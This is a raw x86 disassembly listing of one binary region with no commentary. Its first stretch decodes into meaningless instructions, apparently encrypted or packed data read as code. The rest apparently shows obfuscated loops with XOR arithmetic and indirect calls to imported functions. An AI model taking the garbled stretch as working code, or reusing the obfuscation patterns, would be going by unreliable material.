  418a67:	and    al,0x4
  418a69:	jmp    0xc7d5:0xb44a9ccd
  418a70:	and    eax,0x1c89c242
  418a75:	adc    esp,esi
  418a77:	adc    al,ch
  418a79:	pop    esi
  418a7a:	push   esp
  418a7b:	or     BYTE PTR [eax],bh
  418a7d:	sub    BYTE PTR [edx+esi*1+0x77],bl
  418a81:	ds ds xchg edi,eax
  418a84:	xor    al,0x6b
  418a86:	push   edi
  418a87:	push   es
  418a88:	pop    esp
  418a89:	sub    DWORD PTR [eax-0x48],esi
  418a8c:	add    ecx,DWORD PTR [ebp-0x76]
  418a8f:	jbe    0x418ac4
  418a91:	push   ebp
  418a92:	sub    eax,0xf8741b1b
  418a97:	dec    edx
  418a98:	push   esp
  418a99:	sub    BYTE PTR [ecx],dh
  418a9b:	jmp    0x20dd50e5
  418aa0:	cmp    esi,DWORD PTR [esi]
  418aa2:	pop    ecx
  418aa3:	push   ebp
  418aa4:	mov    esp,0xf4dcc578
  418aa9:	pop    esi
  418aaa:	enter  0x7c11,0x5f
  418aae:	das    
  418aaf:	popa   
  418ab0:	inc    ecx
  418ab1:	std    
  418ab2:	fist   DWORD PTR [edi-0x5dc0bfd0]
  418ab8:	retf   
  418ab9:	ret    0xcec
  418abc:	je     0x418b26
  418abe:	dec    esi
  418abf:	push   ebp
  418ac0:	cmc    
  418ac1:	popa   
  418ac2:	jmp    0x418a78
  418ac4:	add    ch,BYTE PTR [ecx]
  418ac6:	les    ecx,FWORD PTR [eax-0x8bd2e82]
  418acc:	(bad)  
  418ace:	cmp    DWORD PTR [edi],esi
  418ad0:	neg    DWORD PTR [eax-0x61]
  418ad3:	push   ecx
  418ad4:	jmp    esp
  418ad6:	out    0xa2,eax
  418ad8:	imul   edx,DWORD PTR [ecx],0x25
  418adb:	jns    0x418aaf
  418add:	aam    0x53
  418adf:	out    dx,eax
  418ae0:	pop    ds
  418ae1:	pop    ebp
  418ae2:	ja     0x418adc
  418ae4:	push   ss
  418ae5:	pop    es
  418ae6:	shl    bh,1
  418ae8:	inc    edi
  418ae9:	ins    DWORD PTR es:[edi],dx
  418aea:	xchg   ebx,eax
  418aeb:	mov    eax,ds:0x440b3213
  418af0:	xchg   edx,eax
  418af1:	add    eax,0x215f065a
  418af6:	jp     0x418ab3
  418af8:	xchg   ebx,eax
  418af9:	int3   
  418afa:	and    BYTE PTR [edx+0x31],ch
  418afd:	inc    ebp
  418afe:	call   0x1f0460e4
  418b03:	add    BYTE PTR [eax+0x72],dh
  418b06:	sub    bl,al
  418b08:	(bad)  
  418b09:	dec    ebp
  418b0a:	sub    DWORD PTR [esi-0x1974df56],eax
  418b10:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418b11:	pushf  
  418b12:	fcom   QWORD PTR [ecx+0x16b6b1a2]
  418b18:	in     al,0x8a
  418b1a:	cs (bad) 
  418b1c:	test   al,0xec
  418b1e:	dec    esp
  418b1f:	mov    ecx,0x1e1a541e
  418b24:	dec    ecx
  418b25:	adc    edx,DWORD PTR [ebp-0x4155b87b]
  418b2b:	inc    edx
  418b2c:	out    0xdb,eax
  418b2e:	dec    ebx
  418b2f:	or     esp,ebp
  418b31:	stos   DWORD PTR es:[edi],eax
  418b32:	iret   
  418b33:	xchg   BYTE PTR [edx+0x33],dl
  418b36:	mov    cl,0x73
  418b38:	and    al,0xe0
  418b3a:	adc    ebp,DWORD PTR [edi+eiz*8-0x22]
  418b3e:	jbe    0x418b1a
  418b40:	xchg   edi,eax
  418b41:	mov    cs,WORD PTR [edi-0x55]
  418b44:	and    BYTE PTR [edi],0xe8
  418b47:	jecxz  0x418aea
  418b49:	test   eax,0x8c846020
  418b4e:	or     eax,0x317b54b8
  418b53:	mov    dh,0xb
  418b55:	jle    0x418b83
  418b57:	cmp    al,0x4a
  418b59:	test   BYTE PTR [eax],bh
  418b5b:	retf   0x34f8
  418b5e:	pusha  
  418b5f:	cdq    
  418b60:	(bad)  
  418b61:	outs   dx,BYTE PTR ds:[si]
  418b63:	jne    0x418b44
  418b65:	scas   al,BYTE PTR es:[edi]
  418b66:	mov    ecx,0x1fb07613
  418b6b:	and    eax,0x678f1aca
  418b70:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418b71:	into   
  418b72:	stc    
  418b73:	dec    ebp
  418b74:	loopne 0x418b4f
  418b76:	sub    al,0x85
  418b78:	jns    0x418b06
  418b7a:	inc    DWORD PTR ds:0xde620e55
  418b80:	pop    esp
  418b81:	dec    edi
  418b82:	cmp    al,0x1f
  418b84:	or     al,0x35
  418b86:	(bad)  
  418b87:	sub    edx,DWORD PTR [ebx+0x2c77d1dc]
  418b8d:	js     0x418b56
  418b8f:	or     al,0x75
  418b91:	xchg   al,bh
  418b93:	das    
  418b94:	add    ebx,DWORD PTR [eax-0x30004b84]
  418b9a:	pop    ds
  418b9b:	jl     0x418ba3
  418b9d:	add    edx,DWORD PTR [eax+eiz*2-0x6dcc640f]
  418ba4:	ror    esp,cl
  418ba6:	dec    ecx
  418ba7:	mov    ds:0xb0090446,eax
  418bac:	push   0xffffffd8
  418bae:	and    eax,0xa61bc22e
  418bb3:	or     ah,BYTE PTR [edx]
  418bb5:	xchg   ecx,eax
  418bb6:	sub    esp,DWORD PTR [ebx+0x1b]
  418bb9:	inc    ebp
  418bba:	mov    bh,0x39
  418bbc:	mov    esi,0xdd820d9
  418bc1:	mov    DWORD PTR [esi-0x6d],ebp
  418bc4:	fisub  WORD PTR [ebp+0x20]
  418bc7:	push   ebp
  418bc8:	jge    0x418b7e
  418bca:	cmp    ch,0x24
  418bcd:	mov    eax,0x38473eda
  418bd2:	or     eax,0x8a8dcbf2
  418bd7:	and    ecx,DWORD PTR [eax*2-0x7339df06]
  418bde:	pop    ecx
  418bdf:	pop    ecx
  418be0:	cdq    
  418be1:	lods   eax,DWORD PTR ds:[esi]
  418be2:	push   0xffffffff
  418be4:	push   ebx
  418be5:	push   ecx
  418be6:	cmc    
  418be7:	inc    ecx
  418be8:	(bad)
  418beb:	xor    al,0x48
  418bed:	data16 cmp al,0x67
  418bf0:	(bad)  
  418bf1:	push   edi
  418bf2:	fdiv   QWORD PTR [esi-0x4b]
  418bf5:	cli    
  418bf6:	pop    eax
  418bf7:	cmp    al,0xda
  418bf9:	not    esp
  418bfb:	add    BYTE PTR [esi],dl
  418bfd:	aaa    
  418bfe:	bound  edx,QWORD PTR [ebp+0x5cc0edef]
  418c04:	xor    eax,0x1690a3b9
  418c09:	lods   eax,DWORD PTR ds:[esi]
  418c0a:	and    ah,BYTE PTR [edx+0x59]
  418c0d:	popf   
  418c0e:	hlt    
  418c0f:	pop    ss
  418c10:	xor    BYTE PTR [edi+esi*8-0x6f39919e],0xda
  418c18:	push   0x2f7eb193
  418c1d:	retf   
  418c1e:	in     al,dx
  418c1f:	es data16 (bad) 
  418c22:	fs hlt 
  418c24:	sub    al,0xbd
  418c26:	data16 xlat BYTE PTR ds:[ebx]
  418c28:	lods   al,BYTE PTR ss:[esi]
  418c2a:	imul   ecx,DWORD PTR [ebx-0x50],0x313e51e6
  418c31:	fdiv   QWORD PTR [eax]
  418c33:	jbe    0x418be8
  418c35:	pop    eax
  418c36:	int    0xed
  418c38:	lahf   
  418c39:	mov    ebx,0xdaf38ffb
  418c3e:	xor    al,0x4d
  418c40:	fs mov ecx,0xdf378714
  418c46:	mov    ds:0x5e3f54df,eax
  418c4b:	add    DWORD PTR [ebx],esi
  418c4d:	(bad)
  418c51:	out    0x67,eax
  418c53:	aas    
  418c54:	hlt    
  418c55:	ins    DWORD PTR es:[edi],dx
  418c56:	inc    esp
  418c57:	pop    edi
  418c58:	pop    ebx
  418c59:	xor    eax,edx
  418c5b:	cwde   
  418c5c:	add    BYTE PTR [edx*1+0x1c8a44a8],al
  418c63:	daa    
  418c64:	sbb    cl,BYTE PTR [eax]
  418c66:	sub    esi,DWORD PTR [edi]
  418c68:	stc    
  418c69:	scas   eax,DWORD PTR es:[edi]
  418c6a:	jmp    0x418bed
  418c6c:	js     0x418c83
  418c6e:	data16 test al,0x28
  418c71:	nop
  418c72:	mov    DWORD PTR [ebx+esi*4-0x4f],eax
  418c76:	arpl   WORD PTR [ebx],ax
  418c78:	icebp  
  418c79:	pop    eax
  418c7a:	add    DWORD PTR [esi],esi
  418c7c:	mov    ds:0x8df4ebbd,al
  418c81:	enter  0xcc93,0x79
  418c85:	mov    eax,0x25143850
  418c8a:	push   ecx
  418c8b:	imul   edx,DWORD PTR [ebx+0x564a024d],0x26
  418c92:	nop
  418c93:	pop    ebp
  418c94:	dec    ebp
  418c95:	in     al,0x86
  418c97:	cli    
  418c98:	xor    BYTE PTR [edi],cl
  418c9a:	mov    bl,0x64
  418c9c:	jnp    0x418cf0
  418c9e:	xor    al,0xdb
  418ca0:	(bad)  
  418ca1:	popf   
  418ca2:	xchg   DWORD PTR [esi+eiz*4+0x6b],ecx
  418ca6:	xor    bh,BYTE PTR [ecx-0x2d]
  418ca9:	xchg   ebp,eax
  418caa:	fadd   st,st(2)
  418cac:	rol    DWORD PTR [ecx+0x68334b68],cl
  418cb2:	or     ch,cl
  418cb4:	xor    eax,0x2e310bc1
  418cb9:	dec    edx
  418cba:	shr    BYTE PTR [esi-0x676d2a0a],cl
  418cc0:	in     eax,dx
  418cc1:	and    edx,edx
  418cc3:	mov    bh,0x46
  418cc5:	retf   
  418cc6:	or     ah,BYTE PTR [ebx+ebp*1-0x1c]
  418cca:	jmp    0x29e8:0x24bab619
  418cd1:	adc    al,0xb2
  418cd3:	dec    edx
  418cd4:	inc    ebp
  418cd5:	clc    
  418cd6:	imul   eax,ebp,0x63
  418cd9:	dec    DWORD PTR [ebx]
  418cdb:	xchg   BYTE PTR [ebp-0x1879ca27],cl
  418ce1:	adc    eax,0xa079b734
  418ce6:	xchg   esi,eax
  418ce7:	push   edx
  418ce8:	enter  0x3502,0x8f
  418cec:	xchg   edi,eax
  418ced:	fwait
  418cee:	in     eax,0xe2
  418cf0:	sti    
  418cf1:	xchg   DWORD PTR [ebp+esi*8+0x56bad33b],edx
  418cf8:	cmp    esi,ecx
  418cfa:	push   cs
  418cfb:	les    edx,FWORD PTR [ebx-0x4e]
  418cfe:	fadd   DWORD PTR [ecx+edx*2+0x58467e2d]
  418d05:	xchg   ecx,eax
  418d06:	sahf   
  418d07:	fstp   TBYTE PTR [edx]
  418d09:	jmp    DWORD PTR [ebx+0x6f]
  418d0c:	stos   DWORD PTR es:[edi],eax
  418d0d:	push   es
  418d0e:	or     eax,0x474adb0d
  418d13:	dec    edi
  418d14:	jecxz  0x418c9d
  418d16:	out    0x24,al
  418d18:	and    dl,BYTE PTR [esi-0x7474a341]
  418d1e:	inc    esi
  418d1f:	dec    ebx
  418d20:	mov    cs,WORD PTR [ebx]
  418d22:	push   ds
  418d23:	loope  0x418d5e
  418d25:	adc    ecx,DWORD PTR [eax+esi*4+0x12]
  418d29:	jmp    esp
  418d2b:	rcl    edi,1
  418d2d:	xchg   edi,eax
  418d2e:	jns    0x418cca
  418d30:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418d31:	mov    esi,0x65e73542
  418d36:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418d37:	adc    ebx,edx
  418d39:	imul   ebx,DWORD PTR [ecx-0x7a181a77],0x7e55ece3
  418d43:	int    0xfe
  418d45:	dec    esi
  418d46:	mov    edi,0x1838823e
  418d4b:	xchg   esi,eax
  418d4c:	add    BYTE PTR fs:[ebx+0x1d810173],bl
  418d53:	jae    0x418cd5
  418d55:	xor    eax,0x23f87741
  418d5a:	and    eax,0x65de6e13
  418d5f:	sbb    eax,0xd08ddef3
  418d64:	xchg   esp,eax
  418d65:	cdq    
  418d66:	iret   
  418d67:	arpl   WORD PTR [eax+0x16274127],dx
  418d6d:	sbb    al,0x6d
  418d6f:	shl    bh,1
  418d71:	pop    ebp
  418d72:	shr    BYTE PTR [ebx],0x73
  418d75:	dec    eax
  418d76:	call   0x6cc9:0xb8255618
  418d7d:	push   ebx
  418d7e:	or     dl,BYTE PTR [ecx+0x60ee6d2c]
  418d84:	cmc    
  418d85:	sub    BYTE PTR [ecx+0x77],dl
  418d88:	mov    esi,DWORD PTR [edi-0x2e8aa60d]
  418d8e:	push   ss
  418d8f:	cmp    esi,ecx
  418d91:	lds    eax,FWORD PTR [edx-0x7f]
  418d94:	mov    ds:0x6b6e368b,al
  418d99:	js     0x418da7
  418d9b:	and    ebp,DWORD PTR [eax+edx*4+0x2f]
  418d9f:	adc    DWORD PTR [eax-0x13],0xffffffe7
  418da3:	push   ebp
  418da4:	retf   0x237c
  418da7:	xchg   ebx,eax
  418da8:	pusha  
  418da9:	pop    ss
  418daa:	dec    esp
  418dab:	je     0x418d61
  418dad:	jne    0x418dea
  418daf:	push   esi
  418db0:	repz push ds
  418db2:	or     al,0x9e
  418db4:	push   esi
  418db5:	xchg   ebx,eax
  418db6:	mov    esi,0x91efaf76
  418dbb:	dec    edi
  418dbc:	into   
  418dbd:	add    eax,0xbfbeb21b
  418dc2:	outs   dx,BYTE PTR ds:[esi]
  418dc3:	les    esi,FWORD PTR [eax-0x26]
  418dc6:	ret    
  418dc7:	sub    dl,BYTE PTR [ecx+0x48d75991]
  418dcd:	inc    ebx
  418dcf:	gs pop ds
  418dd1:	cdq    
  418dd2:	jmp    0x528f:0x3d3722fc
  418dd9:	jo     0x418e28
  418ddb:	adc    BYTE PTR [eax],0x77
  418dde:	push   ds
  418ddf:	icebp  
  418de0:	test   BYTE PTR [esp+eax*8+0x62],0xaa
  418de5:	clc    
  418de6:	pop    esp
  418de7:	test   DWORD PTR [edi+0x2f4d53c0],ecx
  418ded:	fidivr WORD PTR [ebx-0x699b5bd2]
  418df3:	fdivr  DWORD PTR [esi+ebp*4-0x79]
  418df7:	add    BYTE PTR [ebx],ah
  418df9:	aad    0xda
  418dfb:	jnp    0x418daf
  418dfd:	adc    BYTE PTR [ebx+0x75394a07],ch
  418e03:	inc    edx
  418e04:	push   esi
  418e05:	aaa    
  418e06:	fdivr  st(2),st
  418e08:	into   
  418e09:	mov    edx,DWORD PTR [ebp-0x10]
  418e0c:	or     DWORD PTR ds:0x428e9b,0x120f
  418e16:	mov    ebx,DWORD PTR [ebp-0x8]
  418e19:	adc    DWORD PTR ds:0x428e7b,0x428ec3
  418e23:	xor    edx,eax
  418e25:	or     DWORD PTR ds:0x428ec3,0x428e27
  418e2f:	xor    ebx,eax
  418e31:	sub    edx,ebx
  418e33:	sub    edx,esi
  418e35:	sbb    DWORD PTR ds:0x428e8f,0x4a4
  418e3f:	xor    edx,eax
  418e41:	mov    DWORD PTR [ebp-0x10],edx
  418e44:	mov    edx,DWORD PTR ds:0x428e2b
  418e4a:	mov    edx,DWORD PTR [ebp-0x14]
  418e4d:	mov    DWORD PTR [ebp+0x8],edx
  418e50:	mov    DWORD PTR ds:0x428e7b,0x3079
  418e5a:	jmp    0x418fdc
  418e5f:	xor    DWORD PTR ds:0x428eb3,0x4ecc
  418e69:	mov    edx,DWORD PTR [ebp+0x8]
  418e6c:	mov    ebx,DWORD PTR [ebp-0x8]
  418e6f:	adc    DWORD PTR ds:0x428ecf,0x68d0
  418e79:	xor    edx,eax
  418e7b:	xor    ebx,eax
  418e7d:	sub    edx,ebx
  418e7f:	or     DWORD PTR ds:0x428e9b,ecx
  418e85:	sub    edx,esi
  418e87:	and    DWORD PTR ds:0x428e9f,0x0
  418e91:	jmp    0x418ea5
  418e96:	xor    ebx,ebx
  418e98:	xor    ebx,DWORD PTR ds:0x428e9f
  418e9e:	inc    ebx
  418e9f:	mov    DWORD PTR ds:0x428e9f,ebx
  418ea5:	cmp    DWORD PTR ds:0x428e9f,0x1e
  418eac:	jae    0x418eec
  418eb2:	cmp    DWORD PTR ds:0x428e9f,0xc
  418eb9:	jge    0x418eec
  418ebf:	jmp    0x418ecd
  418ec4:	push   DWORD PTR [ebp-0x18]
  418ec7:	call   DWORD PTR ds:0x42a9cf
  418ecd:	cmp    DWORD PTR ds:0x428e9f,0xb
  418ed4:	jne    0x418ee7
  418eda:	mov    ebx,DWORD PTR ds:0x428e9f
  418ee0:	inc    ebx
  418ee1:	mov    DWORD PTR ds:0x428e9f,ebx
  418ee7:	jmp    0x418e96
  418eec:	xor    edx,eax
  418eee:	mov    DWORD PTR [ebp+0x8],edx
  418ef1:	mov    edx,DWORD PTR [ebp+0x8]
  418ef4:	mov    ebx,DWORD PTR [ebp-0x58]
  418ef7:	sub    DWORD PTR ds:0x428e8f,0x48c7
  418f01:	add    edx,0x5708e4
  418f07:	and    DWORD PTR ds:0x428e2f,0x10a3
  418f11:	imul   edx,ebx
  418f14:	dec    ebx
  418f15:	mov    DWORD PTR [ebp-0x58],edx
  418f18:	adc    ebx,edx
  418f1a:	mov    edx,DWORD PTR [ebp+0x8]
  418f1d:	mov    ebx,DWORD PTR [ebp-0x54]
  418f20:	add    edx,0x64f882
  418f26:	or     edx,ebx
  418f28:	and    DWORD PTR ds:0x428e2b,edi
  418f2e:	mov    DWORD PTR [ebp-0x54],edx
  418f31:	mov    edx,DWORD PTR ds:0x428eeb
  418f37:	mov    ebx,DWORD PTR ds:0x428ef7
  418f3d:	sub    edx,ebx
  418f3f:	xor    edx,DWORD PTR [edx+ebx*1]
  418f42:	mov    edx,DWORD PTR [ebp+0x8]
  418f45:	mov    DWORD PTR ds:0x428ec3,0x13
  418f4f:	cmp    DWORD PTR ds:0x428ec3,0x0
  418f56:	je     0x418fa5
  418f5c:	cmp    DWORD PTR ds:0x428ec3,0x2
  418f63:	jl     0x418fa5
  418f69:	jmp    0x418f79
  418f6e:	push   0x4281a7
  418f73:	call   DWORD PTR ds:0x42a9d3
  418f79:	cmp    DWORD PTR ds:0x428ec3,0x3
  418f80:	jne    0x418f93
  418f86:	mov    ebx,DWORD PTR ds:0x428ec3
  418f8c:	dec    ebx
  418f8d:	mov    DWORD PTR ds:0x428ec3,ebx
  418f93:	mov    ebx,DWORD PTR ds:0x428ec3
  418f99:	dec    ebx
  418f9a:	mov    DWORD PTR ds:0x428ec3,ebx
  418fa0:	jmp    0x418f4f
  418fa5:	mov    ebx,DWORD PTR [ebp-0x50]
  418fa8:	add    edx,ecx
  418faa:	xor    edx,ebx
  418fac:	mov    DWORD PTR [ebp-0x50],edx
  418faf:	mov    edx,DWORD PTR [ebp+0x8]
  418fb2:	mov    ebx,DWORD PTR [ebp-0x4c]
  418fb5:	add    edx,edi
  418fb7:	and    edx,ebx
  418fb9:	mov    DWORD PTR [ebp-0x4c],edx
  418fbc:	mov    edx,DWORD PTR [ebp+0x8]
  418fbf:	mov    ebx,DWORD PTR [ebp-0x48]
  418fc2:	lea    edx,[ebx+edx*1+0x241fcdf]
  418fc9:	mov    DWORD PTR [ebp-0x48],edx
  418fcc:	mov    edx,DWORD PTR [ebp+0x8]
  418fcf:	mov    ebx,0xfa5e1522
  418fd4:	sub    ebx,edx
  418fd6:	add    ebx,DWORD PTR [ebp-0x44]
  418fd9:	mov    DWORD PTR [ebp-0x44],ebx
  418fdc:	mov    edx,DWORD PTR [ebp+0x8]
  418fdf:	xor    edx,eax
  418fe1:	add    edx,esi
  418fe3:	jne    0x418e5f
  418fe9:	mov    edx,DWORD PTR [ebp-0xc]
  418fec:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  418ff3:	mov    bl,BYTE PTR [ebp-0x1]
  418ff6:	cmp    dl,bl
  418ff8:	je     0x4190d6
  418ffe:	mov    ecx,DWORD PTR [ebp-0x5c]
  419001:	mov    edx,DWORD PTR [ebp-0xc]
  419004:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  41900b:	mov    ebx,DWORD PTR [ebp+0xc]
  41900e:	xor    ecx,eax
  419010:	cmp    dl,BYTE PTR [ebx+ecx*1+0x3272f6]
  419017:	jne    0x41920a
  41901d:	mov    ecx,DWORD PTR [ebp-0x5c]
  419020:	mov    edx,DWORD PTR [ebp+0xc]
  419023:	xor    ecx,eax
  419025:	movsx  ecx,BYTE PTR [edx+ecx*1+0x3272f6]
  41902d:	mov    edx,DWORD PTR [ebp-0x18]
  419030:	xor    edx,eax
  419032:	add    edx,esi
  419034:	cmp    ecx,edx
  419036:	mov    ecx,DWORD PTR [ebp-0x14]
  419039:	mov    DWORD PTR [ebp+0x8],ecx
  41903c:	mov    ecx,DWORD PTR [ebp+0x8]
  41903f:	je     0x419312
  419045:	xor    ecx,eax
  419047:	add    ecx,esi
  419049:	mov    ecx,0x242ebf1
  41904e:	je     0x41915e
  419054:	mov    edx,DWORD PTR [ebp+0x8]
  419057:	mov    ebx,DWORD PTR [ebp-0x8]
  41905a:	xor    edx,eax
  41905c:	xor    ebx,eax
  41905e:	sub    edx,ebx
  419060:	sub    edx,esi
  419062:	xor    edx,eax
  419064:	mov    DWORD PTR [ebp+0x8],edx
  419067:	mov    edx,DWORD PTR [ebp+0x8]
  41906a:	mov    ebx,DWORD PTR [ebp-0x58]
  41906d:	add    edx,0x5708e4
  419073:	imul   edx,ebx
  419076:	mov    DWORD PTR [ebp-0x58],edx
  419079:	mov    edx,DWORD PTR [ebp+0x8]
  41907c:	mov    ebx,DWORD PTR [ebp-0x54]
  41907f:	add    edx,0x64f882
  419085:	or     edx,ebx
  419087:	mov    DWORD PTR [ebp-0x54],edx
  41908a:	mov    edx,DWORD PTR [ebp+0x8]
  41908d:	mov    ebx,DWORD PTR [ebp-0x50]
  419090:	add    edx,ecx
  419092:	xor    edx,ebx
  419094:	mov    DWORD PTR [ebp-0x50],edx
  419097:	mov    edx,DWORD PTR [ebp+0x8]
  41909a:	mov    ebx,DWORD PTR [ebp-0x4c]
  41909d:	add    edx,edi
  41909f:	and    edx,ebx
  4190a1:	mov    DWORD PTR [ebp-0x4c],edx
  4190a4:	mov    edx,DWORD PTR [ebp+0x8]
  4190a7:	mov    ebx,DWORD PTR [ebp-0x48]
  4190aa:	lea    edx,[ebx+edx*1+0x241fcdf]
  4190b1:	mov    DWORD PTR [ebp-0x48],edx
  4190b4:	mov    edx,DWORD PTR [ebp+0x8]
  4190b7:	mov    ebx,0xfa5e1522
  4190bc:	sub    ebx,edx
  4190be:	add    ebx,DWORD PTR [ebp-0x44]
  4190c1:	mov    DWORD PTR [ebp-0x44],ebx
  4190c4:	mov    edx,DWORD PTR [ebp+0x8]
  4190c7:	xor    edx,eax
  4190c9:	add    edx,esi
  4190cb:	jne    0x419054
  4190d1:	jmp    0x41915e
  4190d6:	mov    edx,DWORD PTR [ebp-0x14]
  4190d9:	mov    DWORD PTR [ebp+0x8],edx
  4190dc:	jmp    0x419151
  4190e1:	mov    edx,DWORD PTR [ebp+0x8]
  4190e4:	mov    ebx,DWORD PTR [ebp-0x8]
  4190e7:	xor    edx,eax
  4190e9:	xor    ebx,eax
  4190eb:	sub    edx,ebx
  4190ed:	sub    edx,esi
  4190ef:	xor    edx,eax
  4190f1:	mov    DWORD PTR [ebp+0x8],edx
  4190f4:	mov    edx,DWORD PTR [ebp+0x8]
  4190f7:	mov    ebx,DWORD PTR [ebp-0x58]
  4190fa:	add    edx,0x5708e4
  419100:	imul   edx,ebx
  419103:	mov    DWORD PTR [ebp-0x58],edx
  419106:	mov    edx,DWORD PTR [ebp+0x8]
  419109:	mov    ebx,DWORD PTR [ebp-0x54]
  41910c:	add    edx,0x64f882
  419112:	or     edx,ebx
  419114:	mov    DWORD PTR [ebp-0x54],edx
  419117:	mov    edx,DWORD PTR [ebp+0x8]
  41911a:	mov    ebx,DWORD PTR [ebp-0x50]
  41911d:	add    edx,ecx
  41911f:	xor    edx,ebx
  419121:	mov    DWORD PTR [ebp-0x50],edx
  419124:	mov    edx,DWORD PTR [ebp+0x8]
  419127:	mov    ebx,DWORD PTR [ebp-0x4c]
  41912a:	add    edx,edi
  41912c:	and    edx,ebx
  41912e:	mov    DWORD PTR [ebp-0x4c],edx
  419131:	mov    edx,DWORD PTR [ebp+0x8]
  419134:	mov    ebx,DWORD PTR [ebp-0x48]
  419137:	lea    edx,[ebx+edx*1+0x241fcdf]
  41913e:	mov    DWORD PTR [ebp-0x48],edx
  419141:	mov    edx,DWORD PTR [ebp+0x8]
  419144:	mov    ebx,0xfa5e1522
  419149:	sub    ebx,edx
  41914b:	add    ebx,DWORD PTR [ebp-0x44]
  41914e:	mov    DWORD PTR [ebp-0x44],ebx
  419151:	mov    edx,DWORD PTR [ebp+0x8]
  419154:	xor    edx,eax
  419156:	add    edx,esi
  419158:	jne    0x4190e1
  41915e:	mov    edx,DWORD PTR [ebp-0x14]
  419161:	mov    DWORD PTR [ebp+0x8],edx
  419164:	jmp    0x4191d9
  419169:	mov    edx,DWORD PTR [ebp+0x8]
  41916c:	mov    ebx,DWORD PTR [ebp-0x8]
  41916f:	xor    edx,eax
  419171:	xor    ebx,eax
  419173:	sub    edx,ebx
  419175:	sub    edx,esi
  419177:	xor    edx,eax
  419179:	mov    DWORD PTR [ebp+0x8],edx
  41917c:	mov    edx,DWORD PTR [ebp+0x8]
  41917f:	mov    ebx,DWORD PTR [ebp-0x58]
  419182:	add    edx,0x5708e4
  419188:	imul   edx,ebx
  41918b:	mov    DWORD PTR [ebp-0x58],edx
  41918e:	mov    edx,DWORD PTR [ebp+0x8]
  419191:	mov    ebx,DWORD PTR [ebp-0x54]
  419194:	add    edx,0x64f882
  41919a:	or     edx,ebx
  41919c:	mov    DWORD PTR [ebp-0x54],edx
  41919f:	mov    edx,DWORD PTR [ebp+0x8]
  4191a2:	mov    ebx,DWORD PTR [ebp-0x50]
  4191a5:	add    edx,ecx
  4191a7:	xor    edx,ebx
  4191a9:	mov    DWORD PTR [ebp-0x50],edx
  4191ac:	mov    edx,DWORD PTR [ebp+0x8]
  4191af:	mov    ebx,DWORD PTR [ebp-0x4c]
  4191b2:	add    edx,edi
  4191b4:	and    edx,ebx
  4191b6:	mov    DWORD PTR [ebp-0x4c],edx
  4191b9:	mov    edx,DWORD PTR [ebp+0x8]
  4191bc:	mov    ebx,DWORD PTR [ebp-0x48]
  4191bf:	lea    edx,[ebx+edx*1+0x241fcdf]
  4191c6:	mov    DWORD PTR [ebp-0x48],edx
  4191c9:	mov    edx,DWORD PTR [ebp+0x8]
  4191cc:	mov    ebx,0xfa5e1522
  4191d1:	sub    ebx,edx
  4191d3:	add    ebx,DWORD PTR [ebp-0x44]
  4191d6:	mov    DWORD PTR [ebp-0x44],ebx
  4191d9:	mov    edx,DWORD PTR [ebp+0x8]
  4191dc:	xor    edx,eax
  4191de:	add    edx,esi
  4191e0:	jne    0x419169
  4191e6:	mov    edx,DWORD PTR [ebp-0x8]
  4191e9:	mov    ebx,DWORD PTR [ebp-0xc]
  4191ec:	xor    edx,eax
  4191ee:	lea    edx,[edx+ebx*1+0x3272f6]
  4191f5:	mov    DWORD PTR [ebp-0xc],edx
  4191f8:	mov    edx,DWORD PTR [ebp-0x10]
  4191fb:	xor    edx,eax
  4191fd:	add    edx,esi
  4191ff:	jne    0x416a2c
  419205:	jmp    0x41931c
  41920a:	mov    ecx,DWORD PTR [ebp-0x14]
  41920d:	mov    DWORD PTR [ebp+0x8],ecx
  419210:	jmp    0x419289
  419215:	mov    ecx,DWORD PTR [ebp+0x8]
  419218:	mov    edx,DWORD PTR [ebp-0x8]
  41921b:	xor    ecx,eax
  41921d:	xor    edx,eax
  41921f:	sub    ecx,edx
  419221:	sub    ecx,esi
  419223:	xor    ecx,eax
  419225:	mov    DWORD PTR [ebp+0x8],ecx
  419228:	mov    ecx,DWORD PTR [ebp+0x8]
  41922b:	mov    edx,DWORD PTR [ebp-0x58]
  41922e:	add    ecx,0x5708e4
  419234:	imul   ecx,edx
  419237:	mov    DWORD PTR [ebp-0x58],ecx
  41923a:	mov    ecx,DWORD PTR [ebp+0x8]
  41923d:	mov    edx,DWORD PTR [ebp-0x54]
  419240:	add    ecx,0x64f882
  419246:	or     ecx,edx
  419248:	mov    DWORD PTR [ebp-0x54],ecx
  41924b:	mov    ecx,DWORD PTR [ebp+0x8]
  41924e:	mov    edx,DWORD PTR [ebp-0x50]
  419251:	add    ecx,0x242ebf1
  419257:	xor    ecx,edx
  419259:	mov    DWORD PTR [ebp-0x50],ecx
  41925c:	mov    ecx,DWORD PTR [ebp+0x8]
  41925f:	mov    edx,DWORD PTR [ebp-0x4c]
  419262:	add    ecx,edi
  419264:	and    ecx,edx
  419266:	mov    DWORD PTR [ebp-0x4c],ecx
  419269:	mov    ecx,DWORD PTR [ebp+0x8]
  41926c:	mov    edx,DWORD PTR [ebp-0x48]
  41926f:	lea    ecx,[edx+ecx*1+0x241fcdf]
  419276:	mov    DWORD PTR [ebp-0x48],ecx
  419279:	mov    ecx,DWORD PTR [ebp+0x8]
  41927c:	mov    edx,0xfa5e1522
  419281:	sub    edx,ecx
  419283:	add    edx,DWORD PTR [ebp-0x44]
  419286:	mov    DWORD PTR [ebp-0x44],edx
  419289:	mov    ecx,DWORD PTR [ebp+0x8]
  41928c:	xor    ecx,eax
  41928e:	add    ecx,esi
  419290:	jne    0x419215
  419296:	jmp    0x419328
  41929b:	mov    ecx,DWORD PTR [ebp+0x8]
  41929e:	mov    edx,DWORD PTR [ebp-0x8]
  4192a1:	xor    ecx,eax
  4192a3:	xor    edx,eax
  4192a5:	sub    ecx,edx
  4192a7:	sub    ecx,esi
  4192a9:	xor    ecx,eax
  4192ab:	mov    DWORD PTR [ebp+0x8],ecx
  4192ae:	mov    ecx,DWORD PTR [ebp+0x8]
  4192b1:	mov    edx,DWORD PTR [ebp-0x58]
  4192b4:	add    ecx,0x5708e4
  4192ba:	imul   ecx,edx
  4192bd:	mov    DWORD PTR [ebp-0x58],ecx
  4192c0:	mov    ecx,DWORD PTR [ebp+0x8]
